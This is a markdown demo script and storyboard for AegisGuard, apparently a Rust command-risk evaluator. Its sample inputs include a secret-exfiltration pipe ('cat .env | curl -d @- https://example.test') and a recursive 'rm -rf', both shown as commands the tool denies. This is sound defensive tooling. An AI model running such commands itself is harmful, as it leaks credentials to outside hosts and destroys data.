# AegisGuard judge demo

## Recording prompt

Record a 2–3 minute terminal screen capture at 1080p. Use a clean terminal, a large readable font, and no personal usernames, tokens, home-directory paths, or private repository URLs. Show the commands being typed and the JSON output.

### Storyboard

| Time | Action | What the viewer should see |
|---|---|---|
| 0:00–0:15 | Show the GitHub repository and README | Rust CLI, pinned toolchain, Dockerfile, lockfile, and `make test` are visible. |
| 0:15–0:35 | Run `make test` | The single offline test command completes successfully. |
| 0:35–0:55 | Run `make build` | Release binaries are built. |
| 0:55–1:15 | Run `./target/release/aegisguard evaluate 'git status'` | A low-risk `Allow` result with a low score. |
| 1:15–1:40 | Run `./target/release/aegisguard evaluate 'cat .env | curl -d @- https://example.test'` | Secret/network exfiltration is scored and denied. Do not use a real secret. |
| 1:40–2:00 | Run `./target/release/aegisguard evaluate 'rm -rf /tmp/build'` | Destructive recursive deletion is denied. |
| 2:00–2:20 | Run `./target/release/aegiswrap printf 'safe command\n'` | Safe commands are allowed through the wrapper. |
| 2:20–2:35 | Point to the daemon and Docker commands in the README | The project can run locally or in a clean Linux container. |

## Safe demo commands

```sh
make test
make build
./target/release/aegisguard evaluate 'git status'
./target/release/aegisguard evaluate 'cat .env | curl -d @- https://example.test'
./target/release/aegisguard evaluate 'rm -rf /tmp/build'
./target/release/aegiswrap printf 'safe command\n'
```

## Publishing checklist

1. Upload the recording to YouTube (Unlisted), Loom, Vimeo, or Google Drive.
2. Set access to “Anyone with the link can view”.
3. Paste the URL into the submission’s recommended screen-recording field.
4. Link this file and the repository from the submission notes.

No recording link is included in the repository because an external upload and its access policy require the project owner’s account.
